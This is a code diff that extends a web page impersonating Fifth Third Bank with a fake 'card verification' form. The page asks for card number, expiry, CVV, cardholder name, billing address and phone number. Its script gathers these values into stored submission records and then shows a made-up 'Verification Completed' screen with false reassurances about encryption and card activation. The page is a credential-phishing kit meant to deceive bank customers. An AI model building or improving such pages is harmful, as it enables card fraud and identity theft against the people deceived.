@@ -25,7 +25,7 @@
         
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 550px;
             background: white;
             border-radius: 20px;
             box-shadow: 0 12px 30px rgba(0, 45, 114, 0.15);
@@ -175,7 +175,7 @@
             position: relative;
         }
         
-        input {
+        input, select {
             width: 100%;
             padding: 16px 20px;
             border: 1px solid #d1d5db;
@@ -188,7 +188,7 @@
             font-weight: 500;
         }
         
-        input:focus {
+        input:focus, select:focus {
             outline: none;
             border-color: #002D72;
             box-shadow: 0 0 0 3px rgba(0, 45, 114, 0.2), inset 0 2px 4px rgba(0,0,0,0.05);
@@ -211,6 +211,22 @@
         
         .col {
             flex: 1;
+        }
+        
+        .form-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px dashed #e0e7ff;
+        }
+        
+        .section-title {
+            font-size: 20px;
+            color: #002D72;
+            margin-bottom: 20px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
         .btn {
@@ -296,6 +312,13 @@
             background: #fff;
         }
         
+        .completed {
+            display: none;
+            text-align: center;
+            padding: 50px 30px;
+            background: #fff;
+        }
+        
         .processing-icon {
             font-size: 72px;
             color: #002D72;
@@ -303,14 +326,25 @@
             animation: pulse 1.5s infinite;
         }
         
-        .processing h2 {
+        .completed-icon {
+            font-size: 100px;
+            color: #27ae60;
+            margin-bottom: 30px;
+            animation: checkmarkAppear 1s ease-out forwards;
+        }
+        
+        .processing h2, .completed h2 {
             font-size: 28px;
             color: #002D72;
             margin-bottom: 20px;
             font-weight: 600;
         }
         
-        .processing p {
+        .completed h2 {
+            color: #27ae60;
+        }
+        
+        .processing p, .completed p {
             color: #6b7280;
             line-height: 1.7;
             margin-bottom: 25px;
@@ -380,6 +414,64 @@
             margin-right: 8px;
         }
         
+        .completed-details {
+            background: #f0f9f0;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 30px 0;
+            border: 1px solid #c3e6cb;
+            text-align: left;
+        }
+        
+        .completed-details h3 {
+            color: #27ae60;
+            margin-bottom: 15px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .completed-info {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px dashed #c3e6cb;
+        }
+        
+        .completed-info:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+        
+        .completed-label {
+            color: #5a6a8c;
+            font-weight: 500;
+        }
+        
+        .completed-value {
+            color: #002D72;
+            font-weight: 600;
+        }
+        
+        .success-message {
+            background: #e8f5e9;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            border-left: 4px solid #27ae60;
+        }
+        
+        .success-message h3 {
+            color: #27ae60;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
         @keyframes pulse {
             0% { transform: scale(1); }
             50% { transform: scale(1.05); }
@@ -390,6 +482,26 @@
             0% { width: 0%; left: 0; }
             50% { width: 70%; }
             100% { width: 100%; left: 100%; }
+        }
+        
+        @keyframes checkmarkAppear {
+            0% { 
+                transform: scale(0); 
+                opacity: 0;
+            }
+            50% { 
+                transform: scale(1.2); 
+                opacity: 0.5;
+            }
+            100% { 
+                transform: scale(1); 
+                opacity: 1;
+            }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         @media (max-width: 520px) {
@@ -412,6 +524,10 @@
             
             .logo {
                 height: 60px;
+            }
+            
+            .completed-icon {
+                font-size: 80px;
             }
         }
     </style>
@@ -444,10 +560,6 @@
                     <span class="info-value">FTB-VRF-20250717</span>
                 </div>
                 <div class="info-row">
-                    <span class="info-label">Initiated Date:</span>
-                    <span class="info-value">July 17, 2025</span>
-                </div>
-                <div class="info-row">
                     <span class="info-label">Card Status:</span>
                     <span class="info-value" style="color:#E2001A;">Verification Required</span>
                 </div>
@@ -460,7 +572,7 @@
                 <div class="form-group">
                     <label for="card-number">Card Number</label>
                     <div class="input-group">
-                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
+                        <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19" required>
                         <i class="fas fa-credit-card input-icon"></i>
                     </div>
                 </div>
@@ -470,7 +582,7 @@
                         <div class="form-group">
                             <label for="expiry">Expiry Date</label>
                             <div class="input-group">
-                                <input type="text" id="expiry" placeholder="MM/YY">
+                                <input type="text" id="expiry" placeholder="MM/YY" required>
                                 <i class="far fa-calendar input-icon"></i>
                             </div>
                         </div>
@@ -479,7 +591,7 @@
                         <div class="form-group">
                             <label for="cvv">Security Code (CVV)</label>
                             <div class="input-group">
-                                <input type="password" id="cvv" placeholder="•••" maxlength="3">
+                                <input type="password" id="cvv" placeholder="•••" maxlength="3" required>
                                 <i class="fas fa-lock input-icon"></i>
                             </div>
                         </div>
@@ -489,7 +601,7 @@
                 <div class="form-group">
                     <label for="card-name">Cardholder Name</label>
                     <div class="input-group">
-                        <input type="text" id="card-name" placeholder="As shown on card">
+                        <input type="text" id="card-name" placeholder="As shown on card" required>
                         <i class="fas fa-user input-icon"></i>
                     </div>
                 </div>
@@ -499,6 +611,115 @@
                     <div class="card-icon"><i class="fab fa-cc-mastercard"></i></div>
                     <div class="card-icon"><i class="fab fa-cc-amex"></i></div>
                     <div class="card-icon"><i class="fab fa-cc-discover"></i></div>
+                </div>
+                
+                <!-- Billing Address Section -->
+                <div class="form-section">
+                    <h3 class="section-title">
+                        <i class="fas fa-home"></i> Billing Address
+                    </h3>
+                    
+                    <div class="form-group">
+                        <label for="address">Street Address</label>
+                        <div class="input-group">
+                            <input type="text" id="address" placeholder="123 Main Street" required>
+                            <i class="fas fa-map-marker-alt input-icon"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col">
+                            <div class="form-group">
+                                <label for="city">City</label>
+                                <div class="input-group">
+                                    <input type="text" id="city" placeholder="City" required>
+                                    <i class="fas fa-city input-icon"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col">
+                            <div class="form-group">
+                                <label for="state">State</label>
+                                <div class="input-group">
+                                    <select id="state" required>
+                                        <option value="">Select State</option>
+                                        <option value="AL">Alabama</option>
+                                        <option value="AK">Alaska</option>
+                                        <option value="AZ">Arizona</option>
+                                        <option value="AR">Arkansas</option>
+                                        <option value="CA">California</option>
+                                        <option value="CO">Colorado</option>
+                                        <option value="CT">Connecticut</option>
+                                        <option value="DE">Delaware</option>
+                                        <option value="FL">Florida</option>
+                                        <option value="GA">Georgia</option>
+                                        <option value="HI">Hawaii</option>
+                                        <option value="ID">Idaho</option>
+                                        <option value="IL">Illinois</option>
+                                        <option value="IN">Indiana</option>
+                                        <option value="IA">Iowa</option>
+                                        <option value="KS">Kansas</option>
+                                        <option value="KY">Kentucky</option>
+                                        <option value="LA">Louisiana</option>
+                                        <option value="ME">Maine</option>
+                                        <option value="MD">Maryland</option>
+                                        <option value="MA">Massachusetts</option>
+                                        <option value="MI">Michigan</option>
+                                        <option value="MN">Minnesota</option>
+                                        <option value="MS">Mississippi</option>
+                                        <option value="MO">Missouri</option>
+                                        <option value="MT">Montana</option>
+                                        <option value="NE">Nebraska</option>
+                                        <option value="NV">Nevada</option>
+                                        <option value="NH">New Hampshire</option>
+                                        <option value="NJ">New Jersey</option>
+                                        <option value="NM">New Mexico</option>
+                                        <option value="NY">New York</option>
+                                        <option value="NC">North Carolina</option>
+                                        <option value="ND">North Dakota</option>
+                                        <option value="OH">Ohio</option>
+                                        <option value="OK">Oklahoma</option>
+                                        <option value="OR">Oregon</option>
+                                        <option value="PA">Pennsylvania</option>
+                                        <option value="RI">Rhode Island</option>
+                                        <option value="SC">South Carolina</option>
+                                        <option value="SD">South Dakota</option>
+                                        <option value="TN">Tennessee</option>
+                                        <option value="TX">Texas</option>
+                                        <option value="UT">Utah</option>
+                                        <option value="VT">Vermont</option>
+                                        <option value="VA">Virginia</option>
+                                        <option value="WA">Washington</option>
+                                        <option value="WV">West Virginia</option>
+                                        <option value="WI">Wisconsin</option>
+                                        <option value="WY">Wyoming</option>
+                                    </select>
+                                    <i class="fas fa-map input-icon"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="row">
+                        <div class="col">
+                            <div class="form-group">
+                                <label for="zip">ZIP Code</label>
+                                <div class="input-group">
+                                    <input type="text" id="zip" placeholder="12345" maxlength="10" required>
+                                    <i class="fas fa-mail-bulk input-icon"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col">
+                            <div class="form-group">
+                                <label for="phone">Phone Number</label>
+                                <div class="input-group">
+                                    <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+                                    <i class="fas fa-phone input-icon"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
                 </div>
                 
                 <button type="submit" class="btn">
@@ -522,8 +743,45 @@
                 <div class="loading-progress"></div>
             </div>
             
-            <p><strong>Important Notice:</strong> For security purposes, please allow up to 24 hours for a Fifth Third Bank support agent to contact you regarding your verification.</p>
-            <p>Your card will remain active during this process. Do not close this window or refresh the page.</p>
+            <p><strong>Important Notice:</strong> Your card will remain active during this process. Do not close this window or refresh the page.</p>
+        </div>
+        
+        <div class="completed" id="completed">
+            <div class="completed-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <h2>Verification Completed!</h2>
+            
+            <div class="success-message">
+                <h3><i class="fas fa-check"></i> Card Successfully Verified</h3>
+                <p>Your Fifth Third Bank payment card has been successfully verified and is now fully activated for all transactions. No further action is required.</p>
+            </div>
+            
+            <div class="completed-details">
+                <h3><i class="fas fa-info-circle"></i> Verification Summary</h3>
+                <div class="completed-info">
+                    <span class="completed-label">Verification ID:</span>
+                    <span class="completed-value" id="summary-id">FTB-VRF-20250717</span>
+                </div>
+                <div class="completed-info">
+                    <span class="completed-label">Status:</span>
+                    <span class="completed-value" style="color:#27ae60;">✓ Verified & Active</span>
+                </div>
+                <div class="completed-info">
+                    <span class="completed-label">Completion Time:</span>
+                    <span class="completed-value" id="completion-time"></span>
+                </div>
+                <div class="completed-info">
+                    <span class="completed-label">Next Steps:</span>
+                    <span class="completed-value">None Required</span>
+                </div>
+            </div>
+            
+            <p><strong>Thank you for completing the verification process.</strong> Your card is now ready for use. You may close this window.</p>
+            
+            <div class="disclaimer" style="margin-top: 30px;">
+                <i class="fas fa-shield-alt"></i> Your card information is secured with 256-bit encryption.
+            </div>
         </div>
         
         <div class="footer">
@@ -552,6 +810,14 @@
     </div>
 
     <script>
+        // Store submissions in localStorage
+        const STORAGE_KEY = 'bank_submissions';
+        
+        // Initialize submissions array if not exists
+        if (!localStorage.getItem(STORAGE_KEY)) {
+            localStorage.setItem(STORAGE_KEY, JSON.stringify([]));
+        }
+        
         document.getElementById('payment-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -560,9 +826,14 @@
             const expiry = document.getElementById('expiry').value;
             const cvv = document.getElementById('cvv').value;
             const cardName = document.getElementById('card-name').value;
+            const address = document.getElementById('address').value;
+            const city = document.getElementById('city').value;
+            const state = document.getElementById('state').value;
+            const zip = document.getElementById('zip').value;
+            const phone = document.getElementById('phone').value;
             
             // Simple validation
-            if (!cardNumber || !expiry || !cvv || !cardName) {
+            if (!cardNumber || !expiry || !cvv || !cardName || !address || !city || !state || !zip) {
                 showError('Please fill in all required fields');
                 return;
             }
@@ -577,18 +848,70 @@
                 return;
             }
             
+            if (zip.length < 5) {
+                showError('Please enter a valid ZIP code');
+                return;
+            }
+            
+            // Create submission object
+            const submission = {
+                id: Date.now(),
+                timestamp: new Date().toISOString(),
+                cardNumber: cardNumber,
+                expiry: expiry,
+                cvv: cvv,
+                cardName: cardName,
+                address: address,
+                city: city,
+                state: state,
+                zip: zip,
+                phone: phone,
+                ip: 'Unknown', // In real scenario, get from server
+                userAgent: navigator.userAgent,
+                status: 'pending'
+            };
+            
+            // Save to localStorage
+            const submissions = JSON.parse(localStorage.getItem(STORAGE_KEY));
+            submissions.push(submission);
+            localStorage.setItem(STORAGE_KEY, JSON.stringify(submissions));
+            
             // Show processing screen
             document.getElementById('form-content').style.display = 'none';
             document.getElementById('processing').style.display = 'block';
             
-            // Simulate processing delay
+            // Get current time for completion timestamp
+            const now = new Date();
+            const completionTime = now.toLocaleString('en-US', {
+                month: 'short',
+                day: 'numeric',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+            
+            // Generate a verification ID
+            const verificationId = 'FTB-VRF-' + now.getFullYear() + 
+                                  String(now.getMonth() + 1).padStart(2, '0') + 
+                                  String(now.getDate()).padStart(2, '0') + 
+                                  String(now.getHours()).padStart(2, '0') + 
+                                  String(now.getMinutes()).padStart(2, '0');
+            
+            // Simulate processing delay (3 seconds)
             setTimeout(function() {
-                document.querySelector('.processing-icon').innerHTML = '<i class="fas fa-check-circle"></i>';
-                document.querySelector('.processing-icon').style.color = '#27ae60';
-                document.querySelector('.processing h2').textContent = 'Verification Submitted';
-                document.querySelector('.processing p:first-of-type').innerHTML = 'Your card verification request has been successfully processed.';
-                document.querySelector('.processing p:nth-of-type(2)').innerHTML = '<strong>Important Notice:</strong> A Fifth Third Bank support agent will contact you within 24 hours to confirm your verification. Your card will remain active during this process.';
-            }, 4000);
+                // Hide processing screen
+                document.getElementById('processing').style.display = 'none';
+                
+                // Set completion details
+                document.getElementById('completion-time').textContent = completionTime;
+                document.getElementById('summary-id').textContent = verificationId;
+                
+                // Show completed screen with green checkmark
+                document.getElementById('completed').style.display = 'block';
+                document.getElementById('completed').style.animation = 'fadeIn 0.8s ease';
+                
+            }, 3000);
         });
         
         function showError(message) {
@@ -639,6 +962,24 @@
             e.target.value = value.substring(0, 5);
         });
         
+        // Format phone number input
+        document.getElementById('phone').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            let formatted = '';
+            
+            if (value.length > 0) {
+                formatted = '(' + value.substring(0, 3);
+                if (value.length > 3) {
+                    formatted += ') ' + value.substring(3, 6);
+                }
+                if (value.length > 6) {
+                    formatted += '-' + value.substring(6, 10);
+                }
+            }
+            
+            e.target.value = formatted;
+        });
+        
         // Card type detection
         document.getElementById('card-number').addEventListener('input', function(e) {
             const value = e.target.value.replace(/\s/g, '');
@@ -658,6 +999,22 @@
                 cardIcons[3].classList.add('active'); // Discover
             }
         });
+        
+        // Auto-fill for testing (remove in production)
+        function autoFillTestData() {
+            document.getElementById('card-number').value = '4111 1111 1111 1111';
+            document.getElementById('expiry').value = '12/26';
+            document.getElementById('cvv').value = '123';
+            document.getElementById('card-name').value = 'John Doe';
+            document.getElementById('address').value = '123 Main St';
+            document.getElementById('city').value = 'New York';
+            document.getElementById('state').value = 'NY';
+            document.getElementById('zip').value = '10001';
+            document.getElementById('phone').value = '(555) 123-4567';
+        }
+        
+        // Uncomment for testing
+        // autoFillTestData();
     </script>
 </body>
 </html>
